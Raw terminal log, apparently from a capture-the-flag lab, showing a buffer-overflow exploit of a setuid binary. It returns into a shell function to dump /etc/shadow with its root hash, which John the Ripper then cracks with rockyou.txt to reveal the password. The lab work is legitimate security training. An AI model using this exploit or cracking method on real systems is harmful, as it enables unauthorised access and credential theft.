@@ -1,0 +1,389 @@
+Script started on 2021-04-03 22:24:07+05:30 [TERM="xterm-256color" TTY="/dev/pts/4" COLUMNS="203" LINES="53"]
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_theCodCaper[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_theCodCaper[00m$ ssh[K[K[Ksubl i[Krsa
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_theCodCaper[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_theCodCaper[00m$ chmod 600 rsa 
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_theCodCaper[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_theCodCaper[00m$ ssh -i rsa pingu@10.10.86.202
+The authenticity of host '10.10.86.202 (10.10.86.202)' can't be established.
+ECDSA key fingerprint is SHA256:jAGdoIBGaTVGRC6n/NXl76tRfHyed/hhboT1IvCPO84.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.86.202' (ECDSA) to the list of known hosts.
+pingu@10.10.86.202's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+Last login: Mon Jan 20 14:14:47 2020
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+pingu@ubuntu:~$ sudo -l
+[sudo] password for pingu: 
+Sorry, user pingu may not run sudo on ubuntu.
+pingu@ubuntu:~$ gdb /opt/secret/root
+GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+[31m[1mpwndbg: [0m[31m[0m[91mloaded 178 commands. Type [35mpwndbg [filter][0m[91m for a list.[0m
+[31m[1mpwndbg: [0m[31m[0m[91mcreated [35m$rebase[0m[91m, [35m$ida[0m[91m gdb functions (can be used with print/break)[0m
+Reading symbols from /opt/secret/root...(no debugging symbols found)...done.
+[31m[1mpwndbg> [0m[31m[0mr < <(cyclic 50)
+Starting program: /opt/secret/root < <(cyclic 50)
+[*] Checking for new versions of pwntools
+    To disable this functionality, set the contents of /home/pingu/.pwntools-cache-2.7/update to 'never'.
+^C
+Program received signal SIGINT, Interrupt.
+0xf7763be9 in __kernel_vsyscall ()
+Traceback (most recent call last):
+  File "/usr/local/bin/cyclic", line 8, in <module>
+    sys.exit(main())
+  File "/usr/local/lib/python2.7/dist-packages/pwnlib/commandline/common.py", line 29, in main
+    import pwnlib.commandline.main
+  File "/usr/local/lib/python2.7/dist-packages/pwnlib/commandline/main.py", line 5, in <module>
+    from pwnlib.commandline import asm
+  File "/usr/local/lib/python2.7/dist-packages/pwnlib/commandline/asm.py", line 8, in <module>
+    from pwn import *
+  File "/usr/local/lib/python2.7/dist-packages/pwn/__init__.py", line 20, in <module>
+    pwnlib.update.check_automatically()
+  File "/usr/local/lib/python2.7/dist-packages/pwnlib/update.py", line 165, in check_automatically
+    perform_check()
+  File "/usr/local/lib/python2.7/dist-packages/pwnlib/update.py", line 123, in perform_check
+    pypi = available_on_pypi(prerelease)
+  File "/usr/local/lib/python2.7/dist-packages/pwnlib/update.py", line 50, in available_on_pypi
+    versions = client.package_releases('pwntools', True)
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1243, in __call__
+    return self.__send(self.__name, args)
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1602, in __request
+    verbose=self.__verbose
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1283, in request
+    return self.single_request(host, handler, request_body, verbose)
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1311, in single_request
+    self.send_content(h, request_body)
+  File "/usr/lib/python2.7/xmlrpclib.py", line 1459, in send_content
+    connection.endheaders(request_body)
+  File "/usr/lib/python2.7/httplib.py", line 1069, in endheaders
+    self._send_output(message_body)
+  File "/usr/lib/python2.7/httplib.py", line 907, in _send_output
+    self.send(msg)
+  File "/usr/lib/python2.7/httplib.py", line 869, in send
+    self.connect()
+  File "/usr/lib/python2.7/httplib.py", line 1286, in connect
+    HTTPConnection.connect(self)
+  File "/usr/lib/python2.7/httplib.py", line 846, in connect
+    self.timeout, self.source_address)
+  File "/usr/lib/python2.7/socket.py", line 566, in create_connection
+    sock.connect(sa)
+  File "/usr/lib/python2.7/socket.py", line 228, in meth
+    return getattr(self._sock,name)(*args)
+KeyboardInterrupt
+LEGEND: [33mSTACK[0m | [34mHEAP[0m | [31mCODE[0m | [35mDATA[0m | [4mRWX[0m | [0mRODATA[0m
+[34m───────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────────────────────────────────────────[0m
+ [1mEAX [0m 0xfffffe00
+ [1mEBX [0m 0x0
+ [1mECX [0m [4m[34m0x8236008[0m[4m[0m[0m ◂— [0m0x0
+ [1mEDX [0m 0x1000
+ [1mEDI [0m 0xffffffc0
+ [1mESI [0m [4m[31m0xf77505a0 (_IO_2_1_stdin_)[0m[4m[0m[0m ◂— [0m[38;5;148mmov[39m[38;5;15m    [39m[38;5;81mbyte[39m[38;5;15m [39m[38;5;81mptr[39m[38;5;15m [39m[38;5;15m[[39m[38;5;81meax[39m[38;5;15m][39m[38;5;15m,[39m[38;5;15m [39m[38;5;81mah[39m /* 0xfbad2088 */
+ [1mEBP [0m [4m[33m0xffe35998[0m[4m[0m[0m —▸ [0m[4m[33m0xffe35fe8[0m[4m[0m[0m —▸ [0m[4m[33m0xffe36028[0m[4m[0m[0m —▸ [0m[4m[33m0xffe36068[0m[4m[0m[0m —▸ [0m[4m[33m0xffe36078[0m[4m[0m[0m ◂— [0m[0m...[0m
+ [1mESP [0m [4m[33m0xffe35948[0m[4m[0m[0m —▸ [0m[4m[33m0xffe35998[0m[4m[0m[0m —▸ [0m[4m[33m0xffe35fe8[0m[4m[0m[0m —▸ [0m[4m[33m0xffe36028[0m[4m[0m[0m —▸ [0m[4m[33m0xffe36068[0m[4m[0m[0m ◂— [0m[0m...[0m
+ [1mEIP [0m [31m0xf7763be9 (__kernel_vsyscall+9)[0m[0m ◂— [0m[38;5;148mpop[39m[38;5;15m    [39m[38;5;81mebp[39m
+[34m────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────[0m
+[1m[32m ►[0m[1m[0m [1m[32m0xf7763be9[0m[1m[0m [1m[32m<__kernel_vsyscall+9>  [0m[1m[0m   [1m[32m[38;5;148mpop[39m[38;5;15m    [39m[38;5;81mebp[39m[0m[1m[0m
+   [0m0xf7763bea[0m [0m<__kernel_vsyscall+10> [0m   [38;5;148mpop[39m[38;5;15m    [39m[38;5;81medx[39m
+   [0m0xf7763beb[0m [0m<__kernel_vsyscall+11> [0m   [38;5;148mpop[39m[38;5;15m    [39m[38;5;81mecx[39m
+   [0m0xf7763bec[0m [0m<__kernel_vsyscall+12> [0m   [38;5;148mret[39m[38;5;15m    [39m
+[0m    ↓[0m
+   [0m0xf7673b23[0m [0m<__read_nocancel+25>   [0m   [38;5;148mpop[39m[38;5;15m    [39m[38;5;81mebx[39m
+   [0m0xf7673b24[0m [0m<__read_nocancel+26>   [0m   [38;5;148mcmp[39m[38;5;15m    [39m[38;5;81meax[39m[38;5;15m,[39m[38;5;15m [39m[38;5;141m0xfffff001[39m
+   [0m0xf7673b29[0m [0m<__read_nocancel+31>   [0m   [38;5;148m[1mjae[0m[39m[38;5;15m    [39m[38;5;141m__syscall_error[39m <[31m0xf75b6730[0m>
+[0m    ↓[0m
+   [0m0xf75b6730[0m [0m<__syscall_error>      [0m   [38;5;148m[1mcall[0m[39m[38;5;15m   [39m[38;5;141m__x86.get_pc_thunk.dx[39m <[31m0xf76bdb5d[0m>
+ 
+   [0m0xf75b6735[0m [0m<__syscall_error+5>    [0m   [38;5;148madd[39m[38;5;15m    [39m[38;5;81medx[39m[38;5;15m,[39m[38;5;15m [39m[38;5;141m0x1998cb[39m
+   [0m0xf75b673b[0m [0m<__syscall_error+11>   [0m   [38;5;148mmov[39m[38;5;15m    [39m[38;5;81mecx[39m[38;5;15m,[39m[38;5;15m [39m[38;5;81mdword[39m[38;5;15m [39m[38;5;81mptr[39m[38;5;15m [39m[38;5;81mgs[39m[38;5;15m:[39m[38;5;15m[[39m[38;5;141m0[39m[38;5;15m][39m
+   [0m0xf75b6742[0m [0m<__syscall_error+18>   [0m   [38;5;148mneg[39m[38;5;15m    [39m[38;5;81meax[39m
+[34m─────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────────────[0m
+[0m00[0m[0m:[0m[0m0000[0m[0m│[0m[0m[0m [1mesp [0m [4m[33m0xffe35948[0m[4m[0m[0m —▸ [0m[4m[33m0xffe35998[0m[4m[0m[0m —▸ [0m[4m[33m0xffe35fe8[0m[4m[0m[0m —▸ [0m[4m[33m0xffe36028[0m[4m[0m[0m —▸ [0m[4m[33m0xffe36068[0m[4m[0m[0m ◂— [0m[0m...[0m
+[0m01[0m[0m:[0m[0m0004[0m[0m│[0m[0m[0m [1m    [0m [4m[33m0xffe3594c[0m[4m[0m[0m ◂— [0m0x1000
+[0m02[0m[0m:[0m[0m0008[0m[0m│[0m[0m[0m [1m    [0m [4m[33m0xffe35950[0m[4m[0m[0m —▸ [0m[4m[34m0x8236008[0m[4m[0m[0m ◂— [0m0x0
+[0m03[0m[0m:[0m[0m000c[0m[0m│[0m[0m[0m [1m    [0m [4m[33m0xffe35954[0m[4m[0m[0m —▸ [0m[31m0xf7673b23 (__read_nocancel+25)[0m[0m ◂— [0m[38;5;148mpop[39m[38;5;15m    [39m[38;5;81mebx[39m
+[0m04[0m[0m:[0m[0m0010[0m[0m│[0m[0m[0m [1m    [0m [4m[33m0xffe35958[0m[4m[0m[0m —▸ [0m[4m[31m0xf7750000 (_GLOBAL_OFFSET_TABLE_)[0m[4m[0m[0m ◂— [0m[38;5;148mmov[39m[38;5;15m    [39m[38;5;81mal[39m[38;5;15m,[39m[38;5;15m [39m[38;5;141m0x1d[39m /* 0x1b1db0 */
+[0m05[0m[0m:[0m[0m0014[0m[0m│[0m[0m[0m [1m    [0m [4m[33m0xffe3595c[0m[4m[0m[0m —▸ [0m[31m0xf7608267 (_IO_file_underflow+295)[0m[0m ◂— [0m[38;5;148madd[39m[38;5;15m    [39m[38;5;81mesp[39m[38;5;15m,[39m[38;5;15m [39m[38;5;141m0x10[39m
+[0m06[0m[0m:[0m[0m0018[0m[0m│[0m[0m[0m [1m    [0m [4m[33m0xffe35960[0m[4m[0m[0m ◂— [0m0x0
+[0m07[0m[0m:[0m[0m001c[0m[0m│[0m[0m[0m [1m    [0m [4m[33m0xffe35964[0m[4m[0m[0m —▸ [0m[4m[34m0x8236008[0m[4m[0m[0m ◂— [0m0x0
+[34m───────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────────────[0m
+ ► f 0 f7763be9 __kernel_vsyscall+9
+   f 1 f7673b23 __read_nocancel+25
+   f 2 f7608267 _IO_file_underflow+295
+   f 3 f7609237 _IO_default_uflow+23
+   f 4 f760902c __uflow+140
+   f 5 f75edae1 _IO_vfscanf+2753
+   f 6 f75fa13e __isoc99_scanf+126
+   f 7  804851b get_input+23
+   f 8  8048537 main+22
+   f 9 f75b6637 __libc_start_main+247
+[34m───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[0m
+[31m[1mProgram received signal SIGINT[0m[31m[0m
+[31m[1mpwndbg> [0m[31m[0mquit
+pingu@ubuntu:~$ cat /home/pingu/.pwntools-cache-2.7/update
+pingu@ubuntu:~$ cd /home/pingu/.pwntools-cache-2.7/update[K[K[K[K[K[K
+pingu@ubuntu:~/.pwntools-cache-2.7$ ls -la
+total 8
+drwxrwxrwx 2 pingu pingu 4096 Jan 15  2020 .
+drwxrwxrwx 6 pingu pingu 4096 Apr  3 10:03 ..
+-rwxrwxrwx 1 pingu pingu    0 Jan 15  2020 update
+pingu@ubuntu:~/.pwntools-cache-2.7$ echo "never" > update
+pingu@ubuntu:~/.pwntools-cache-2.7$ cat [K[K[K[Kls -la
+total 12
+drwxrwxrwx 2 pingu pingu 4096 Jan 15  2020 .
+drwxrwxrwx 6 pingu pingu 4096 Apr  3 10:03 ..
+-rwxrwxrwx 1 pingu pingu    6 Apr  3 10:04 update
+pingu@ubuntu:~/.pwntools-cache-2.7$ cat update 
+never
+pingu@ubuntu:~/.pwntools-cache-2.7$ cd/h[K[K /home/p[K[K[K[K[K[K[K[K[K[Kcd
+pingu@ubuntu:~$ gdb /opt/secret/root
+GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+[31m[1mpwndbg: [0m[31m[0m[91mloaded 178 commands. Type [35mpwndbg [filter][0m[91m for a list.[0m
+[31m[1mpwndbg: [0m[31m[0m[91mcreated [35m$rebase[0m[91m, [35m$ida[0m[91m gdb functions (can be used with print/break)[0m
+Reading symbols from /opt/secret/root...(no debugging symbols found)...done.
+[31m[1mpwndbg> [0m[31m[0mr < <(cyclic 50)
+Starting program: /opt/secret/root < <(cyclic 50)
+
+Program received signal SIGSEGV, Segmentation fault.
+0x6161616c in ?? ()
+LEGEND: [33mSTACK[0m | [34mHEAP[0m | [31mCODE[0m | [35mDATA[0m | [4mRWX[0m | [0mRODATA[0m
+[34m───────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────────────────────────────────────────[0m
+ [1mEAX [0m 0x1
+ [1mEBX [0m 0x0
+ [1mECX [0m 0x1
+ [1mEDX [0m [4m[31m0xf76e587c (_IO_stdfile_0_lock)[0m[4m[0m[0m ◂— [0m0
+ [1mEDI [0m [4m[31m0xf76e4000 (_GLOBAL_OFFSET_TABLE_)[0m[4m[0m[0m ◂— [0m[38;5;148mmov[39m[38;5;15m    [39m[38;5;81mal[39m[38;5;15m,[39m[38;5;15m [39m[38;5;141m0x1d[39m /* 0x1b1db0 */
+ [1mESI [0m [4m[31m0xf76e4000 (_GLOBAL_OFFSET_TABLE_)[0m[4m[0m[0m ◂— [0m[38;5;148mmov[39m[38;5;15m    [39m[38;5;81mal[39m[38;5;15m,[39m[38;5;15m [39m[38;5;141m0x1d[39m /* 0x1b1db0 */
+ [1mEBP [0m 0x6161616b ('kaaa')
+ [1mESP [0m [4m[33m0xff88acb0[0m[4m[0m[0m ◂— [0m0xf700616d /* 'ma' */
+ [1mEIP [0m 0x6161616c ('laaa')
+[34m────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────[0m
+[31mInvalid address 0x6161616c[0m
+
+
+
+
+
+
+
+
+
+
+[34m─────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────────────[0m
+[0m00[0m[0m:[0m[0m0000[0m[0m│[0m[0m[0m [1mesp [0m [4m[33m0xff88acb0[0m[4m[0m[0m ◂— [0m0xf700616d /* 'ma' */
+[0m01[0m[0m:[0m[0m0004[0m[0m│[0m[0m[0m [1m    [0m [4m[33m0xff88acb4[0m[4m[0m[0m —▸ [0m[4m[33m0xff88acd0[0m[4m[0m[0m ◂— [0m0x1
+[0m02[0m[0m:[0m[0m0008[0m[0m│[0m[0m[0m [1m    [0m [4m[33m0xff88acb8[0m[4m[0m[0m ◂— [0m0x0
+[0m03[0m[0m:[0m[0m000c[0m[0m│[0m[0m[0m [1m    [0m [4m[33m0xff88acbc[0m[4m[0m[0m —▸ [0m[31m0xf754a637 (__libc_start_main+247)[0m[0m ◂— [0m[38;5;148madd[39m[38;5;15m    [39m[38;5;81mesp[39m[38;5;15m,[39m[38;5;15m [39m[38;5;141m0x10[39m
+[0m04[0m[0m:[0m[0m0010[0m[0m│[0m[0m[0m [1m    [0m [4m[33m0xff88acc0[0m[4m[0m[0m —▸ [0m[4m[31m0xf76e4000 (_GLOBAL_OFFSET_TABLE_)[0m[4m[0m[0m ◂— [0m[38;5;148mmov[39m[38;5;15m    [39m[38;5;81mal[39m[38;5;15m,[39m[38;5;15m [39m[38;5;141m0x1d[39m /* 0x1b1db0 */
+[0m... ↓[0m
+[0m06[0m[0m:[0m[0m0018[0m[0m│[0m[0m[0m [1m    [0m [4m[33m0xff88acc8[0m[4m[0m[0m ◂— [0m0x0
+[0m07[0m[0m:[0m[0m001c[0m[0m│[0m[0m[0m [1m    [0m [4m[33m0xff88accc[0m[4m[0m[0m —▸ [0m[31m0xf754a637 (__libc_start_main+247)[0m[0m ◂— [0m[38;5;148madd[39m[38;5;15m    [39m[38;5;81mesp[39m[38;5;15m,[39m[38;5;15m [39m[38;5;141m0x10[39m
+[34m───────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────────────[0m
+ ► f 0 6161616c
+   f 1 f700616d
+[34m───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[0m
+[31m[1mProgram received signal SIGSEGV (fault address 0x6161616c)[0m[31m[0m
+[31m[1mpwndbg> [0m[31m[0mcyclic -l 0x6161616c
+[?25l[?1h=[6n44[K
+[?12l[?25h[?1l> [31m[1mpwndbg> [0m[31m[0mdisassemble sheh[Kll
+Dump of assembler code for function shell:
+   0x080484cb <+0>:	push   ebp
+   0x080484cc <+1>:	mov    ebp,esp
+   0x080484ce <+3>:	sub    esp,0x8
+   0x080484d1 <+6>:	sub    esp,0xc
+   0x080484d4 <+9>:	push   0x3e8
+   0x080484d9 <+14>:	call   0x80483a0 <setuid@plt>
+   0x080484de <+19>:	add    esp,0x10
+   0x080484e1 <+22>:	sub    esp,0xc
+   0x080484e4 <+25>:	push   0x3e8
+   0x080484e9 <+30>:	call   0x8048370 <setgid@plt>
+   0x080484ee <+35>:	add    esp,0x10
+   0x080484f1 <+38>:	sub    esp,0xc
+   0x080484f4 <+41>:	push   0x80485d0
+   0x080484f9 <+46>:	call   0x8048380 <system@plt>
+   0x080484fe <+51>:	add    esp,0x10
+   0x08048501 <+54>:	nop
+   0x08048502 <+55>:	leave  
+   0x08048503 <+56>:	ret    
+End of assembler dump.
+[31m[1mpwndbg> [0m[31m[0mpython -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)'
+  File "<string>", line 1
+    -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)'
+                                                                 ^
+SyntaxError: invalid syntax
+Error while executing Python code.
+[31m[1mpwndbg> [0m[31m[0mpython -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)' | /opt/secret/root
+  File "<string>", line 1
+    -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)' | /opt/secret/root
+                                                                 ^
+SyntaxError: invalid syntax
+Error while executing Python code.
+[31m[1mpwndbg> [0m[31m[0mpython -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)' | /opt/secret/root[C[C[C[C[C[C[1@2
+Undefined command: "python2".  Try "help".
+[31m[1mpwndbg> [0m[31m[0mpython2 -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)' | /opt/secret/root[C[1P[1@3
+Undefined command: "python3".  Try "help".
+[31m[1mpwndbg> [0m[31m[0mpython3 -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)' | /opt/secret/root[C[C[C[1P
+  File "<string>", line 1
+    -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)' | /opt/secret/root
+                                                                 ^
+SyntaxError: invalid syntax
+Error while executing Python code.
+[31m[1mpwndbg> [0m[31m[0mpython -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root
+  File "<string>", line 1
+    -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root
+                                         ^
+SyntaxError: invalid syntax
+Error while executing Python code.
+[31m[1mpwndbg> [0m[31m[0mpython -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root[1P[C[C[C[C[C[1P
+  File "<string>", line 1
+    -c print "A"*44 + "\xcb\x84\x04\x08" | /opt/secret/root
+           ^
+SyntaxError: invalid syntax
+Error while executing Python code.
+[31m[1mpwndbg> [0m[31m[0mpython -c print "A"*44 + "\xcb\x84\x04\x08" | /opt/secret/root[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[2@'print "A"*44 + "\xcb\x84\x04\x08"'[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P[1@'[C[C[C[C[1P[1@'
+  File "<string>", line 1
+    -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root
+                                         ^
+SyntaxError: invalid syntax
+Error while executing Python code.
+[31m[1mpwndbg> [0m[31m[0mpython -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root[C[1P[1@`[C[1P[1@`
+  File "<string>", line 1
+    -c `print "A"*44 + "\xcb\x84\x04\x08"` | /opt/secret/root
+       ^
+SyntaxError: invalid syntax
+Error while executing Python code.
+[31m[1mpwndbg> [0m[31m[0mpython -c `print "A"*44 + "\xcb\x84\x04\x08"` | /opt/secret/root[1P[1@)[C[C[1P[1@(
+  File "<string>", line 1
+    -c (print "A"*44 + "\xcb\x84\x04\x08") | /opt/secret/root
+                ^
+SyntaxError: invalid syntax
+Error while executing Python code.
+[31m[1mpwndbg> [0m[31m[0mpython -c (print "A"*44 + "\xcb\x84\x04\x08") | /opt/secret/root[1P[C[1P[C[C[C[C[C[C[C[C[1@([C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1@)
+  File "<string>", line 1
+    -c print ("A"*44 + "\xcb\x84\x04\x08") | /opt/secret/root
+           ^
+SyntaxError: invalid syntax
+Error while executing Python code.
+[31m[1mpwndbg> [0m[31m[0mpython -c print ("A"*44 + "\xcb\x84\x04\x08") | /opt/secret/root[1P
+  File "<string>", line 1
+    -c print("A"*44 + "\xcb\x84\x04\x08") | /opt/secret/root
+           ^
+SyntaxError: invalid syntax
+Error while executing Python code.
+[31m[1mpwndbg> [0m[31m[0mpython -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)'
+  File "<string>", line 1
+    -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)'
+                                                                 ^
+SyntaxError: invalid syntax
+Error while executing Python code.
+[31m[1mpwndbg> [0m[31m[0mpython -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)'[C[K"[1P[1@"[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P[1@'[C[C[C[1P[1@'[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P<I",0x080484cb)"'<I",0x080484cb)"[C[C[C[1P,0x080484cb)"',0x080484cb)"[C[C[C[C[C[C[C[C[C[C[C[C[C
+  File "<string>", line 1
+    -c "import struct;print 'A'*44 + struct.pack('<I',0x080484cb)"
+                                                                 ^
+SyntaxError: invalid syntax
+Error while executing Python code.
+[31m[1mpwndbg> [0m[31m[0mpython -c "import struct;print 'A'*44 + struct.pack('<I',0x080484cb)"[C[1P[1@([C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C)"
+  File "<string>", line 1
+    -c "import struct;print('A'*44 + struct.pack('<I',0x080484cb))"
+                                                                  ^
+SyntaxError: invalid syntax
+Error while executing Python code.
+[31m[1mpwndbg> [0m[31m[0mwhich python
+Undefined command: "which".  Try "help".
+[31m[1mpwndbg> [0m[31m[0mwhich python[C[C[C[C[C[C[C[Cpython -c "import struct;print('A'*44 + struct.pack('<I',0x080484cb))"[1@2
+Undefined command: "python2".  Try "help".
+[31m[1mpwndbg> [0m[31m[0mpython2 -c "import struct;print('A'*44 + struct.pack('<I',0x080484cb))"[1P[1@3
+Undefined command: "python3".  Try "help".
+[31m[1mpwndbg> [0m[31m[0mpython3 -c "import struct;print('A'*44 + struct.pack('<I',0x080484cb))"[C[C[C[C[C[C[C[1P
+  File "<string>", line 1
+    -c "import struct;print('A'*44 + struct.pack('<I',0x080484cb))"
+                                                                  ^
+SyntaxError: invalid syntax
+Error while executing Python code.
+[31m[1mpwndbg> [0m[31m[0mquit
+pingu@ubuntu:~$ which python
+/usr/bin/python
+pingu@ubuntu:~$ which python2
+/usr/bin/python2
+pingu@ubuntu:~$ which python2[K3
+/usr/bin/python3
+pingu@ubuntu:~$ python -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)'
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˄
+pingu@ubuntu:~$ python -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)'
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˄
+pingu@ubuntu:~$ python -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)' | /opt/secret/root
+root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
+daemon:*:17953:0:99999:7:::
+bin:*:17953:0:99999:7:::
+sys:*:17953:0:99999:7:::
+sync:*:17953:0:99999:7:::
+games:*:17953:0:99999:7:::
+man:*:17953:0:99999:7:::
+lp:*:17953:0:99999:7:::
+mail:*:17953:0:99999:7:::
+news:*:17953:0:99999:7:::
+uucp:*:17953:0:99999:7:::
+proxy:*:17953:0:99999:7:::
+www-data:*:17953:0:99999:7:::
+backup:*:17953:0:99999:7:::
+list:*:17953:0:99999:7:::
+irc:*:17953:0:99999:7:::
+gnats:*:17953:0:99999:7:::
+nobody:*:17953:0:99999:7:::
+systemd-timesync:*:17953:0:99999:7:::
+systemd-network:*:17953:0:99999:7:::
+systemd-resolve:*:17953:0:99999:7:::
+systemd-bus-proxy:*:17953:0:99999:7:::
+syslog:*:17953:0:99999:7:::
+_apt:*:17953:0:99999:7:::
+messagebus:*:18277:0:99999:7:::
+uuidd:*:18277:0:99999:7:::
+papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::
+Segmentation fault
+pingu@ubuntu:~$ exit
+logout
+Connection to 10.10.86.202 closed.
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_theCodCaper[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_theCodCaper[00m$ ssh -i rsa pingu@10.10.86.202[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kjohn [K[K[K[K[Kcd [K[K[Kcp ro[K[K/usr/share/wordlists/rockyou.txt .
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_theCodCaper[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_theCodCaper[00m$ john [K[K[K[K[Ksubl hash 
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_theCodCaper[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_theCodCaper[00m$ john --[K[Khash --wordlist rockyou.txt [1P[1@=
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+love2fish        ([31mroot[0m[0m)
+1g 0:00:00:42 DONE (2021-04-03 23:10) 0.02352g/s 5650p/s 5650c/s 5650C/s lucinha..liomessi
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_theCodCaper[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_theCodCaper[00m$ exit
+exit
+
+Script done on 2021-04-03 23:12:05+05:30 [COMMAND_EXIT_CODE="0"]
